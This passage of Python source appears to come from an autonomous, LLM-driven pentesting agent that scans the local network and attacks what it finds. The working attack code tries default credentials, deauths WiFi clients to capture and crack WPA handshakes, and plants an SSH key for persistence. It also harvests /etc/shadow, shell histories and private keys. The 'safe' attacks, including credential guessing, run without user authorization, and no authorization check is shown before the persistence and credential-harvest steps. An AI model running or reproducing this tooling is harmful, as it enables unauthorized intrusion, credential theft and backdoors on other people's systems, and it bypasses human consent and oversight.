                        ver_num = float(version.split("p")[0].replace("OpenSSH_", ""))
                        if ver_num < 7.0:
                            self._think(f"⚠️ Outdated SSH on {ip}: {version}")
                            is_new = self._create_vuln_notification(ip, port, "outdated_ssh", "medium",
                                f"Outdated OpenSSH ({version}) on {ip}:{port}")
                            severity = "medium"
                    except (ValueError, IndexError):
                        pass

            # HTTP/HTTPS
            elif name in ("http", "https"):
                self.log_knowledge("web_service", f"{ip}:{port}",
                    {"service": name, "version": version, "hostname": hostname},
                    source="analysis")

            # SMB
            elif name in ("microsoft-ds", "netbios-ssn") or port in (445, 139):
                self._think(f"⚠️ SMB on {ip}:{port} — exploit target")
                is_new = self._create_vuln_notification(ip, port, "smb_exposed", "high",
                    f"SMB on {ip}:{port} — brute force or EternalBlue possible")
                if is_new:
                    self.award_xp("service_exploited", detail=f"SMB on {ip}:{port}")
                severity = "high"

            # Databases
            elif name in ("mysql", "postgresql", "ms-sql") or port in (3306, 5432, 1433):
                self._think(f"⚠️ Database exposed on {ip}:{port} ({name})")
                is_new = self._create_vuln_notification(ip, port, "db_exposed", "high",
                    f"Database {name} on {ip}:{port} — should not be accessible")
                severity = "high"

            # Redis
            elif name == "redis" or port == 6379:
                self._think(f"⚠️ Redis on {ip}:{port} — possible unauth access")
                is_new = self._create_vuln_notification(ip, port, "redis_exposed", "high",
                    f"Redis on {ip}:{port} — may allow unauthenticated access")
                if is_new:
                    self.award_xp("service_exploited", detail=f"Redis on {ip}:{port}")
                severity = "high"

            # RDP
            elif name == "rdp" or port == 3389:
                self._think(f"RDP on {ip}:{port} — brute force target")
                is_new = self._create_vuln_notification(ip, port, "rdp_exposed", "medium",
                    f"RDP on {ip}:{port} — brute force or BlueKeep check")
                severity = "medium"

            # SNMP
            elif name == "snmp" or port in (161, 162):
                self._think(f"⚠️ SNMP on {ip}:{port} — info leak possible")
                is_new = self._create_vuln_notification(ip, port, "snmp_exposed", "medium",
                    f"SNMP on {ip}:{port} — community strings may be default")
                if is_new:
                    self.award_xp("snmp_community_found", detail=f"SNMP on {ip}:{port}")
                severity = "medium"

            # VNC
            elif name == "vnc" or port == 5900:
                self._think(f"⚠️ VNC on {ip}:{port} — unencrypted remote desktop")
                is_new = self._create_vuln_notification(ip, port, "vnc_exposed", "medium",
                    f"VNC on {ip}:{port} — unencrypted remote access")
                severity = "medium"

            # Log knowledge for all services
            self.log_knowledge("service_analysis", f"{ip}:{port}",
                {"service": name, "version": version, "vuln": is_new, "severity": severity},
                source="tamagotchi_analysis")

            if is_new:
                self._stats["vulns_found"] += 1
                new_vulns += 1
                self.award_xp("vuln_found", detail=f"{ip}:{port} ({name})")

        if new_vulns == 0:
            self._think(f"Device {ip} ({hostname or dev_type}) — {len(device.services)} services, clean")

    # ── Full Knowledge Indexing ─────────────────────────────

    async def _index_all_findings(self):
        """Index ALL scan/attack results into knowledge for LLM access."""
        try:
            from agents.sentient import get_sentient_engine
            sentient = get_sentient_engine()

            # Index all devices with full detail
            for ip, dev in self._devices.items():
                svc_list = [{"port": s.port, "name": s.name, "version": s.version} for s in dev.services]
                self.log_knowledge("device_full", ip, {
                    "ip": ip,
                    "hostname": dev.hostname,
                    "mac": dev.mac,
                    "os": dev.os_guess,
                    "type": dev.device_type.value,
                    "services": svc_list,
                    "vulns": dev.vulnerabilities,
                    "first_seen": dev.first_seen,
                    "last_seen": dev.last_seen,
                }, source="index")

                # Index attack surface
                attack_surface = []
                for s in dev.services:
                    if s.name.lower() in ("ssh", "telnet", "ftp", "http", "https", "smb", "rdp", "vnc", "mysql", "redis", "snmp"):
                        attack_surface.append({
                            "port": s.port,
                            "service": s.name,
                            "version": s.version,
                            "attack_vector": self._get_attack_vector(s.name, s.version),
                        })
                if attack_surface:
                    self.log_knowledge("attack_surface", ip, {
                        "targets": attack_surface,
                        "exploitable": any(a["attack_vector"] for a in attack_surface),
                    }, source="index")

            # Index all WiFi APs
            for bssid, ap in self._wifi_aps.items():
                self.log_knowledge("wifi_network", bssid, {
                    "ssid": ap.ssid,
                    "bssid": bssid,
                    "channel": ap.channel,
                    "signal": ap.signal,
                    "encryption": ap.encryption,
                    "risk": "open" if ap.encryption == "off" else "wep" if "wep" in ap.encryption.lower() else "wpa",
                }, source="index")

            # Index all notifications/vulns
            for n in self._notifications:
                if n.type in (NotificationType.VULN_FOUND, NotificationType.ALERT):
                    self.log_knowledge("vulnerability", n.target, {
                        "title": n.title,
                        "message": n.message,
                        "severity": n.severity,
                        "needs_auth": n.needs_auth,
                        "created_at": n.created_at,
                    }, source="index")

            # Index topology
            topology = self.get_topology()
            self.log_knowledge("topology", "current", {
                "nodes": len(topology.get("nodes", [])),
                "edges": len(topology.get("edges", [])),
                "networks": self.get_networks(),
            }, source="index")

            self._think(f"Indexed {len(self._devices)} devices, {len(self._wifi_aps)} APs into knowledge")

        except Exception as e:
            logger.error(f"Knowledge indexing failed: {e}")

    def _get_attack_vector(self, service: str, version: str) -> str:
        """Get known attack vector for a service."""
        vectors = {
            "ssh": "brute_force, key_auth, cve_check",
            "telnet": "credential_sniff, brute_force, default_creds",
            "ftp": "anonymous_login, brute_force, bounce_attack",
            "http": "web_vuln, sqli, xss, rce, dir_traversal",
            "https": "web_vuln, ssl_check, cert_enum",
            "smb": "eternalblue, relay_attack, share_enum, brute_force",
            "rdp": "bluekeep, brute_force, credential_stuff",
            "vnc": "brute_force, auth_bypass",
            "mysql": "brute_force, udf_privesc, file_read",
            "redis": "unauth_access, ssh_key_write, crontab_write",
            "snmp": "community_string_enum, snmpwalk",
        }
        svc_lower = service.lower()
        for key, val in vectors.items():
            if key in svc_lower:
                return val
        return ""

    # ── Report Generation ───────────────────────────────────

    async def _generate_report(self):
        """Generate a summary report of all findings."""
        try:
            devices = self.get_devices()
            wifi_aps = self.get_wifi_aps()
            networks = self.get_networks()
            topology = self.get_topology()

            report = {
                "timestamp": time.time(),
                "summary": {
                    "total_devices": len(devices),
                    "total_wifi_aps": len(wifi_aps),
                    "total_networks": len(networks),
                    "vulns_found": self._stats["vulns_found"],
                    "open_networks": self._stats.get("open_networks_found", 0),
                    "handshakes": self._stats.get("handshakes_captured", 0),
                },
                "devices": [],
                "wifi_networks": [],
                "vulnerabilities": [],
                "topology": topology,
            }

            for dev in devices:
                dev_report = {
                    "ip": dev.get("ip"),
                    "hostname": dev.get("hostname", ""),
                    "type": dev.get("type", "unknown"),
                    "os": dev.get("os_guess", ""),
                    "services": [
                        {"port": s.get("port"), "name": s.get("name"), "version": s.get("version")}
                        for s in dev.get("services", [])
                    ],
                }
                report["devices"].append(dev_report)

            for ap in wifi_aps:
                report["wifi_networks"].append({
                    "ssid": ap.get("ssid"),
                    "bssid": ap.get("bssid"),
                    "signal": ap.get("signal"),
                    "encryption": ap.get("encryption"),
                    "channel": ap.get("channel"),
                })

            # Collect all vulns from notifications
            for n in self._notifications:
                if n.type == NotificationType.VULN_FOUND:
                    report["vulnerabilities"].append({
                        "target": n.target,
                        "title": n.title,
                        "message": n.message,
                        "severity": n.severity,
                    })

            self._reports.append(report)
            if len(self._reports) > 20:
                self._reports = self._reports[-20:]

            # Save report to disk
            report_file = self._data_dir / f"report_{int(time.time())}.json"
            try:
                with open(report_file, 'w') as f:
                    json.dump(report, f, indent=2)
                self._think(f"Report saved: {report_file.name}")
            except Exception as e:
                logger.error(f"Failed to save report: {e}")

        except Exception as e:
            logger.error(f"Report generation failed: {e}")

    # ══════════════════════════════════════════════════════════════
    # PENTESTER WORKFLOW: AI Decision Engine + Auto-Exploitation
    # ══════════════════════════════════════════════════════════════

    # ── 1. AI Decision Engine ────────────────────────────────────

    async def _ai_query(self, prompt: str, system: str = "", max_tokens: int = 1024) -> str:
        """Query the LLM for a decision. Returns empty string on failure."""
        try:
            from core.inference import get_inference_engine, InferenceRequest
            engine = get_inference_engine()
            if not engine._initialized:
                return ""
            sys = system or (
                "You are ELIOT's tamagotchi agent — an autonomous pentester AI. "
                "Analyze the situation and return a JSON array of actions to take. "
                "Each action: {\"action\": \"...\", \"target\": \"...\", \"tool\": \"...\", \"command\": \"...\", \"risk\": \"safe|auth_required\", \"reason\": \"...\"}. "
                "Only suggest actions that are possible with the tools available (nmap, hydra, nikto, sqlmap, aircrack-ng, etc). "
                "Return ONLY the JSON array, no markdown."
            )
            req = InferenceRequest(
                prompt=prompt,
                system_prompt=sys,
                max_tokens=max_tokens,
                temperature=0.3,
            )
            resp = engine.complete(req)
            return resp.text.strip() if resp.finish_reason != "error" else ""
        except Exception as e:
            logger.debug(f"AI query failed: {e}")
            return ""

    async def _ai_decide_next_actions(self) -> List[Dict[str, Any]]:
        """Use LLM to decide what exploits/attacks to try next based on current findings."""
        if not self._devices:
            return []

        device_summary = []
        for ip, dev in self._devices.items():
            svcs = [{"port": s.port, "name": s.name, "version": s.version} for s in dev.services]
            device_summary.append({
                "ip": ip, "hostname": dev.hostname, "os": dev.os_guess,
                "type": dev.device_type.value, "services": svcs,
                "vulns": dev.vulnerabilities[:5],
            })

        vuln_summary = []
        for n in self._notifications:
            if n.type == NotificationType.VULN_FOUND:
                vuln_summary.append({"target": n.target, "title": n.title, "severity": n.severity})

        prompt = (
            f"Current network state:\n"
            f"- Devices: {json.dumps(device_summary[:15], default=str)}\n"
            f"- Vulnerabilities: {json.dumps(vuln_summary[:20], default=str)}\n"
            f"- WiFi APs: {len(self._wifi_aps)}\n"
            f"- Our IP: {self._our_ip}\n"
            f"- Completed phases: network_discovery, wifi_recon, host_discovery, service_analysis, os_detection, vuln_scanning\n\n"
            f"Decide the next 3-5 most impactful actions to take. Focus on:\n"
            "1. Testing default credentials on exposed services (SSH, FTP, Redis, MySQL, Telnet)\n"
            "2. Checking anonymous access (FTP, SMB)\n"
            "3. Exploiting known vulnerabilities\n"
            "4. WiFi handshake capture on close networks\n"
            "5. Web application testing on HTTP services\n"
            "Return a JSON array of actions."
        )

        self._think("Consulting AI for next actions...")
        raw = await self._ai_query(prompt)
        if not raw:
            return self._fallback_actions()

        try:
            # Extract JSON array from response
            start = raw.find('[')
            end = raw.rfind(']') + 1
            if start >= 0 and end > start:
                actions = json.loads(raw[start:end])
                if isinstance(actions, list):
                    self._think(f"AI proposed {len(actions)} actions")
                    return actions
        except (json.JSONDecodeError, ValueError):
            pass

        return self._fallback_actions()

    def _fallback_actions(self) -> List[Dict[str, Any]]:
        """Deterministic fallback when LLM is unavailable — try the most common attacks."""
        actions = []
        for ip, dev in self._devices.items():
            svc_names = {s.name.lower() for s in dev.services}
            ports = {s.port for s in dev.services}

            if "ssh" in svc_names or 22 in ports:
                actions.append({"action": "try_default_creds", "target": ip, "tool": "ssh", "risk": "safe", "reason": "Test SSH default credentials"})
            if "ftp" in svc_names or 21 in ports:
                actions.append({"action": "check_anon_ftp", "target": ip, "tool": "ftp", "risk": "safe", "reason": "Check FTP anonymous access"})
            if "redis" in svc_names or 6379 in ports:
                actions.append({"action": "check_redis_unauth", "target": ip, "tool": "redis-cli", "risk": "safe", "reason": "Test Redis unauthenticated access"})
            if "mysql" in svc_names or 3306 in ports:
                actions.append({"action": "try_default_creds", "target": ip, "tool": "mysql", "risk": "safe", "reason": "Test MySQL default credentials"})
            if "telnet" in svc_names or 23 in ports:
                actions.append({"action": "try_default_creds", "target": ip, "tool": "telnet", "risk": "safe", "reason": "Test Telnet default credentials"})
            if "microsoft-ds" in svc_names or "netbios-ssn" in svc_names or 445 in ports or 139 in ports:
                actions.append({"action": "check_smb_null", "target": ip, "tool": "smbclient", "risk": "safe", "reason": "Test SMB null session"})
            for s in dev.services:
                if s.name.lower() in ("http", "https") and s.port in (80, 443, 8080, 8443):
                    actions.append({"action": "web_fingerprint", "target": f"{ip}:{s.port}", "tool": "nikto", "risk": "safe", "reason": "Web application fingerprinting"})
                    break
        return actions[:8]

    # ── 2. Safe Auto-Exploitation ────────────────────────────────

    async def _auto_exploit_safe(self):
        """Try safe exploits that don't cause damage: default creds, anon access, unauth services."""
        self._think("Phase 8a: Auto-exploiting safe targets...")
        actions = await self._ai_decide_next_actions()

        if not actions:
            self._think("No safe actions to try")
            return

        for action in actions:
            if self._paused:
                while self._paused and self._running:
                    await asyncio.sleep(1)

            act_type = action.get("action", "")
            target = action.get("target", "")
            risk = action.get("risk", "auth_required")

            if risk == "auth_required":
                # Queue for user authorization
                self._queue_exploit_proposal(action)
                continue

            self._think(f"Auto-exploit: {act_type} on {target}")

            try:
                if act_type == "try_default_creds":
                    await self._try_default_creds(target, action.get("tool", "ssh"))
                elif act_type == "check_anon_ftp":
                    await self._check_anon_ftp(target)
                elif act_type == "check_redis_unauth":
                    await self._check_redis_unauth(target)
                elif act_type == "check_smb_null":
                    await self._check_smb_null(target)
                elif act_type == "web_fingerprint":
                    await self._web_fingerprint(target)
            except Exception as e:
                logger.debug(f"Auto-exploit {act_type} failed on {target}: {e}")
                self.record_mistake(act_type, "success", "error")

    async def _try_default_creds(self, target: str, service: str):
        """Try common default credentials on a service."""
        defaults = {
            "ssh": [
                ("root", "root"), ("admin", "admin"), ("root", "toor"),
                ("root", "password"), ("admin", "password"), ("root", ""),
                ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("admin", "1234"),
                ("test", "test"), ("user", "user"), ("root", "123456"),
            ],
            "ftp": [
                ("anonymous", ""), ("anonymous", "anonymous"),
                ("ftp", "ftp"), ("admin", "admin"), ("root", "root"),
            ],
            "mysql": [
                ("root", ""), ("root", "root"), ("root", "password"),
                ("admin", "admin"), ("mysql", "mysql"),
            ],
            "telnet": [
                ("admin", "admin"), ("root", "root"), ("admin", "password"),
                ("root", "1234"), ("support", "support"),
            ],
            "redis": [("", "")],
        }

        creds = defaults.get(service, defaults.get("ssh", []))
        port = 22
        for dev_ip, dev in self._devices.items():
            if dev_ip == target or target.startswith(dev_ip):
                for s in dev.services:
                    if s.name.lower() == service or (service == "ssh" and s.port == 22):
                        port = s.port
                        break

        for user, passwd in creds[:6]:
            try:
                if service == "ssh":
                    cmd = f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no {user}@{target} -p {port} 'echo ELIOT_PWNED' 2>/dev/null"
                elif service == "ftp":
                    cmd = f"curl -s --connect-timeout 3 ftp://{user}:{passwd}@{target}:{port}/ 2>/dev/null | head -5"
                elif service == "mysql":
                    cmd = f"mysql -h {target} -P {port} -u {user} {'-p'+passwd if passwd else ''} -e 'SELECT 1' 2>/dev/null"
                elif service == "telnet":
                    cmd = f"echo '' | timeout 3 telnet {target} {port} 2>/dev/null | head -5"
                elif service == "redis":
                    cmd = f"redis-cli -h {target} -p {port} PING 2>/dev/null"
                else:
                    continue

                stdout = await self._fast_nmap(cmd, timeout=10)
                if any(kw in stdout.lower() for kw in ["eliot_pwned", "pong", "+----", "connected", "welcome"]):
                    cred_str = f"{user}:{passwd}" if passwd else f"{user}:<empty>"
                    # Only award XP / notify if not already found
                    already = any(n.target == target and "Default credentials" in n.title for n in self._notifications)
                    if not already:
                        self._think(f"DEFAULT CREDS FOUND on {target}:{port} ({service}) — {cred_str}")
                        self.award_xp("default_creds_found", detail=f"{target}:{port} {cred_str}")
                    self.create_notification(
                        NotificationType.ALERT,
                        f"Default credentials: {target}:{port}",
                        f"Service: {service}, Credentials: {cred_str}",
                        severity="critical",
                        target=target,
                    )
                    self.log_knowledge("exploit", f"default_creds_{target}_{port}", {
                        "target": target, "port": port, "service": service,
                        "user": user, "password": passwd, "success": True,
                    }, source="auto_exploit")
                    return
            except Exception:
                continue

        self.log_knowledge("exploit", f"default_creds_{target}_{port}", {
            "target": target, "port": port, "service": service, "success": False,
        }, source="auto_exploit")

    async def _check_anon_ftp(self, target: str):
        """Check for FTP anonymous access."""
        port = 21
        for dev_ip, dev in self._devices.items():
            if dev_ip == target:
                for s in dev.services:
                    if s.name.lower() == "ftp":
                        port = s.port
                        break

        stdout = await self._fast_nmap(
            f"curl -s --connect-timeout 5 ftp://anonymous:x@{target}:{port}/ 2>/dev/null", timeout=15
        )
        if stdout.strip() and "permission denied" not in stdout.lower():
            already = any(n.target == target and "FTP anonymous" in n.title for n in self._notifications)
            if not already:
                self._think(f"FTP ANONYMOUS ACCESS on {target}:{port}")
                self.award_xp("ftp_anon_access", detail=f"{target}:{port}")
            self.create_notification(
                NotificationType.ALERT,
                f"FTP anonymous access: {target}:{port}",
                f"Listing: {stdout[:200]}",
                severity="high",
                target=target,
            )
            self.log_knowledge("exploit", f"ftp_anon_{target}", {
                "target": target, "port": port, "anonymous": True, "listing": stdout[:500],
            }, source="auto_exploit")

    async def _check_redis_unauth(self, target: str):
        """Check for Redis unauthenticated access."""
        port = 6379
        stdout = await self._fast_nmap(f"redis-cli -h {target} -p {port} INFO server 2>/dev/null | head -10", timeout=10)
        if "redis_version" in stdout:
            already = any(n.target == target and "Redis unauthenticated" in n.title for n in self._notifications)
            if not already:
                self._think(f"REDIS UNAUTHENTICATED ACCESS on {target}:{port}")
                self.award_xp("redis_unauthenticated", detail=f"{target}:{port}")
            self.create_notification(
                NotificationType.ALERT,
                f"Redis unauthenticated: {target}:{port}",
                f"Info: {stdout[:200]}",
                severity="critical",
                target=target,
            )
            # Check if we can write SSH keys
            ssh_check = await self._fast_nmap(f"redis-cli -h {target} -p {port} CONFIG GET dir 2>/dev/null", timeout=10)
            if "authorized_keys" in ssh_check or "/root" in ssh_check:
                self._think(f"Redis can write to SSH dir on {target} — backdoor possible")
                self.log_knowledge("exploit", f"redis_write_{target}", {
                    "target": target, "port": port, "ssh_writable": True,
                }, source="auto_exploit")
            self.log_knowledge("exploit", f"redis_unauth_{target}", {
                "target": target, "port": port, "info": stdout[:500],
            }, source="auto_exploit")

    async def _check_smb_null(self, target: str):
        """Check for SMB null session."""
        stdout = await self._fast_nmap(
            f"smbclient -L {target} -N 2>/dev/null | head -20", timeout=15
        )
        if "sharename" in stdout.lower() or "disk" in stdout.lower():
            already = any(n.target == target and "SMB null session" in n.title for n in self._notifications)
            if not already:
                self._think(f"SMB NULL SESSION on {target}")
                self.award_xp("smb_null_session", detail=f"{target}")
            self.create_notification(
                NotificationType.ALERT,
                f"SMB null session: {target}",
                f"Shares: {stdout[:300]}",
                severity="high",
                target=target,
            )
            self.log_knowledge("exploit", f"smb_null_{target}", {
                "target": target, "shares": stdout[:1000],
            }, source="auto_exploit")
            # Try listing shares
            shares = await self._fast_nmap(
                f"smbclient //{target}/ -N -c 'ls' 2>/dev/null | head -10", timeout=15
            )
            if shares.strip():
                self.log_knowledge("exploit", f"smb_listing_{target}", {
                    "target": target, "listing": shares[:1000],
                }, source="auto_exploit")

    async def _web_fingerprint(self, target: str):
        """Fingerprint a web service: check headers, technologies, known vulns."""
        ip_port = target.split(":")
        ip = ip_port[0]
        port = int(ip_port[1]) if len(ip_port) > 1 else 80
        proto = "https" if port in (443, 8443) else "http"

        # Grab headers and technology
        stdout = await self._fast_nmap(
            f"curl -sI --connect-timeout 5 {proto}://{target}/ 2>/dev/null", timeout=10
        )
        tech = []
        if "server:" in stdout.lower():
            for line in stdout.split("\n"):
                if line.lower().startswith("server:"):
                    tech.append(line.split(":", 1)[1].strip())
        if "x-powered-by:" in stdout.lower():
            for line in stdout.split("\n"):
                if line.lower().startswith("x-powered-by:"):
                    tech.append(line.split(":", 1)[1].strip())

        if tech:
            self._think(f"Web tech on {target}: {', '.join(tech)}")
            self.log_knowledge("web_service", f"fingerprint_{target}", {
                "target": target, "technologies": tech, "headers": stdout[:500],
            }, source="web_fingerprint")

        # Check for common paths
        paths_to_check = ["/robots.txt", "/.env", "/admin", "/wp-login.php", "/phpmyadmin", "/.git/HEAD"]
        for path in paths_to_check:
            check = await self._fast_nmap(
                f"curl -s --connect-timeout 3 -o /dev/null -w '%{{http_code}}' {proto}://{target}{path} 2>/dev/null", timeout=8
            )
            code = check.strip().replace("'", "")
            if code in ("200", "301", "302"):
                self._think(f"Interesting path on {target}: {path} (HTTP {code})")
                self.log_knowledge("web_service", f"path_{target}_{path.replace('/','_')}", {
                    "target": target, "path": path, "status": code,
                }, source="web_fingerprint")
                self.award_xp("service_exploited", detail=f"Web path {target}{path}")

    # ── 3. WiFi Handshake Capture ────────────────────────────────

    async def _capture_handshake(self):
        """Capture WPA/WPA2 handshakes from nearby networks."""
        self._think("Phase 2b: Attempting WiFi handshake capture...")

        if not self._wifi_interface:
            self._think("No WiFi interface available for handshake capture")
            return

        # Find networks with strong signal for handshake capture
        target_aps = []
        for bssid, ap in self._wifi_aps.items():
            if ap.encryption == "on" and ap.signal > -75:
                target_aps.append(ap)

        if not target_aps:
            self._think("No suitable WiFi networks for handshake capture")
            return

        for ap in target_aps[:2]:
            if self._paused:
                break
            self._think(f"Attempting handshake capture on {ap.ssid} ({ap.bssid})...")
            try:
                iface = self._wifi_interface
                # Start airodump-ng capture in background
                cap_file = f"/tmp/handshake_{ap.bssid.replace(':','')}"
                proc = await asyncio.create_subprocess_shell(
                    f"timeout 30 airodump-ng {iface} --bssid {ap.bssid} -c {ap.channel} "
                    f"-w {cap_file} --output-format pcap 2>/dev/null",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                # Send deauth packets to force handshake (if aireplay available)
                deauth_proc = await asyncio.create_subprocess_shell(
                    f"aireplay-ng --deauth 5 -a {ap.bssid} {iface} 2>/dev/null",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                try:
                    await asyncio.wait_for(proc.communicate(), timeout=35)
                except asyncio.TimeoutError:
                    proc.kill()
                deauth_proc.kill()

                # Check if capture file exists and has data
                cap_path = Path(f"{cap_file}-01.cap")
                if cap_path.exists() and cap_path.stat().st_size > 1000:
                    hs_key = f"handshake_{ap.bssid}"
                    if not self._is_known_finding("wifi_capture", hs_key):
                        self._think(f"Handshake captured from {ap.ssid}!")
                        self.award_xp("handshake_captured", detail=f"{ap.ssid} ({ap.bssid})")
                        self.create_notification(
                            NotificationType.NEW_DEVICE,
                            f"WiFi handshake captured: {ap.ssid}",
                            f"BSSID: {ap.bssid}, Channel: {ap.channel}, File: {cap_path.name}",
                            severity="info",
                        )
                        self.log_knowledge("wifi_capture", hs_key, {
                            "ssid": ap.ssid, "bssid": ap.bssid, "channel": ap.channel,
                            "file": str(cap_path), "size": cap_path.stat().st_size,
                        }, source="handshake_capture")
                        self._stats["handshakes_captured"] = self._stats.get("handshakes_captured", 0) + 1

                    # Try to crack with common wordlist
                    await self._crack_handshake(str(cap_path), ap.ssid)
                else:
                    self._think(f"No handshake captured from {ap.ssid} (no clients?)")
            except Exception as e:
                logger.debug(f"Handshake capture failed for {ap.ssid}: {e}")

    async def _crack_handshake(self, cap_file: str, ssid: str):
        """Try cracking a captured WPA handshake with common wordlists."""
        wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/common.txt",
            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
        ]
        wordlist = None
        for wl in wordlists:
            if Path(wl).exists():
                wordlist = wl
                break

        if not wordlist:
            self._think("No wordlist found for handshake cracking")
            return

        self._think(f"Cracking handshake for {ssid} with {Path(wordlist).name}...")
        # Pause Ollama for GPU if available
        self._pause_ollama()
        try:
            stdout = await self._fast_nmap(
                f"aircrack-ng -w {wordlist} -b {ssid} {cap_file} 2>/dev/null", timeout=300
            )
            if "KEY FOUND" in stdout:
                key = stdout.split("KEY FOUND!")[1].strip() if "KEY FOUND" in stdout else "unknown"
                crack_key = f"wpa_cracked_{ssid}"
                if not self._is_known_finding("wifi_attack", crack_key):
                    self._think(f"WPA KEY FOUND for {ssid}: {key}")
                    self.award_xp("wpa_cracked", detail=f"{ssid}: {key}")
                    self.create_notification(
                        NotificationType.ALERT,
                        f"WPA cracked: {ssid}",
                        f"Key: {key}",
                        severity="critical",
                    )
                    self.log_knowledge("wifi_attack", crack_key, {
                        "ssid": ssid, "key": key, "wordlist": wordlist,
                }, source="wpa_crack")
        finally:
            self._resume_ollama()

    # ── 4. Exploit Queue Proposal ────────────────────────────────

    def _queue_exploit_proposal(self, action: Dict[str, Any]):
        """Queue an exploit that needs user authorization."""
        target = action.get("target", "")
        act_type = action.get("action", "")
        tool = action.get("tool", "")
        reason = action.get("reason", "")

        # Check if already queued
        for task in self._exploit_queue:
            if task.target == target and task.command == act_type:
                return

        task = ExploitTask(
            target=target,
            service=tool,
            command=act_type,
            cvss=7.0,
            priority=3,
            auth_status=AuthStatus.PENDING,
        )
        task.metadata["reason"] = reason
        task.metadata["action"] = action
        self._exploit_queue.append(task)
        self._think(f"Queued exploit for authorization: {act_type} on {target}")

        self.create_notification(
            NotificationType.NEW_DEVICE,
            f"Exploit proposed: {act_type}",
            f"Target: {target}, Tool: {tool}, Reason: {reason}",
            severity="warning",
            target=target,
        )

    # ── 5. Post-Exploitation ─────────────────────────────────────

    async def _post_exploit(self):
        """Post-exploitation: enumerate, harvest creds, attempt privesc on compromised hosts."""
        compromised = []
        for n in self._notifications:
            if n.type == NotificationType.ALERT and "default credentials" in n.title.lower():
                ip = n.target
                if ip and ip not in [c["ip"] for c in compromised]:
                    compromised.append({"ip": ip, "creds": n.message})

        if not compromised:
            self._think("No compromised hosts for post-exploitation")
            return

        self._think(f"Phase 9: Post-exploitation on {len(compromised)} host(s)...")

        for host in compromised[:3]:
            ip = host["ip"]
            self._think(f"Enumerating {ip} after access...")

            # Harvest system info
            info = await self._fast_nmap(
                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {ip} 'uname -a; id; cat /etc/os-release' 2>/dev/null", timeout=15
            )
            if info.strip():
                self.log_knowledge("post_exploit", f"enum_{ip}", {
                    "target": ip, "system_info": info[:1000],
                }, source="post_exploit")
                self._think(f"System info from {ip}: {info[:100]}...")

            # Check for privilege escalation paths
            privesc = await self._fast_nmap(
                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {ip} "
                "'sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -10; cat /etc/crontab 2>/dev/null | head -10' "
                "2>/dev/null", timeout=20
            )
            if privesc.strip():
                self.log_knowledge("post_exploit", f"privesc_{ip}", {
                    "target": ip, "privesc_paths": privesc[:1500],
                }, source="post_exploit")
                if "NOPASSWD" in privesc:
                    privesc_key = f"privesc_nopasswd_{ip}"
                    if not self._is_known_finding("post_exploit", privesc_key):
                        self._think(f"NOPASSWD sudo found on {ip} — root access possible!")
                        self.award_xp("privilege_escalated", detail=f"{ip}: NOPASSWD sudo")
                        self.create_notification(
                            NotificationType.ALERT,
                            f"Privilege escalation: {ip}",
                            f"NOPASSWD sudo found: {privesc[:300]}",
                            severity="critical",
                            target=ip,
                        )

            # Try to install persistence (SSH key)
            persistence = await self._fast_nmap(
                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {ip} "
                "'mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo eliot >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo PERSISTENCE_OK' "
                "2>/dev/null", timeout=15
            )
            if "PERSISTENCE_OK" in persistence:
                persist_key = f"persistence_ssh_{ip}"
                if not self._is_known_finding("post_exploit", persist_key):
                    self._think(f"Persistence installed on {ip} via SSH key")
                    self.award_xp("persistence_established", detail=f"{ip}: SSH key")
                    self.log_knowledge("post_exploit", persist_key, {
                        "target": ip, "method": "ssh_key", "success": True,
                    }, source="post_exploit")

            # Harvest credentials
            creds = await self._fast_nmap(
                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {ip} "
                "'cat /etc/shadow 2>/dev/null | head -20; cat ~/.bash_history 2>/dev/null | grep -i pass | head -5; "
                "cat ~/.mysql_history 2>/dev/null | head -5; cat ~/.ssh/id_rsa 2>/dev/null | head -3' "
                "2>/dev/null", timeout=20
            )
            if creds.strip():
                creds_key = f"creds_{ip}"
                if not self._is_known_finding("post_exploit", creds_key):
                    self.log_knowledge("post_exploit", creds_key, {
                        "target": ip, "credentials": creds[:2000],
                    }, source="post_exploit")
                    self.award_xp("credential_harvested", detail=f"{ip}")
                    self._think(f"Credentials harvested from {ip}")

    # ── 6. Bluetooth Scanning ────────────────────────────────────

    async def _scan_bluetooth(self):
        """Scan for Bluetooth devices using hcitool and bluetoothctl."""
        self._think("Scanning for Bluetooth devices...")
        try:
            stdout = await self._fast_nmap("hcitool scan 2>/dev/null", timeout=20)
            devices = []
            for line in stdout.split("\n"):
                line = line.strip()
                if "\t" in line and len(line) > 17:
                    parts = line.split("\t", 1)
                    if len(parts) == 2:
                        mac = parts[0].strip()
                        name = parts[1].strip()
                        devices.append({"mac": mac, "name": name})
                        bt_key = f"device_{mac}"
                        if not self._is_known_finding("bluetooth", bt_key):
                            self.award_xp("bluetooth_found", detail=f"{name} ({mac})")
                            self.log_knowledge("bluetooth", bt_key, {
                                "mac": mac, "name": name,
                            }, source="bluetooth_scan")

            if devices:
                self._think(f"Found {len(devices)} Bluetooth device(s)")
            else:
                self._think("No Bluetooth devices found")

            # Try to get more info on found devices
            for dev in devices[:3]:
                info = await self._fast_nmap(f"sdptool browse {dev['mac']} 2>/dev/null | head -20", timeout=10)
                if info.strip():
                    self.log_knowledge("bluetooth", f"services_{dev['mac']}", {
                        "mac": dev["mac"], "name": dev["name"], "services": info[:1000],
                    }, source="bluetooth_scan")
        except Exception as e:
            logger.debug(f"Bluetooth scan failed: {e}")

    # ── 7. Passive OSINT ─────────────────────────────────────────

    async def _passive_osint(self):
        """Passive OSINT: DNS enumeration, Shodan lookup for our public IP."""
        self._think("Phase 1b: Passive OSINT...")

        # DNS enumeration on our network
        if self._our_ip:
            # Reverse DNS lookup on discovered hosts
            for ip, dev in list(self._devices.items())[:5]:
                stdout = await self._fast_nmap(f"host {ip} 2>/dev/null", timeout=5)
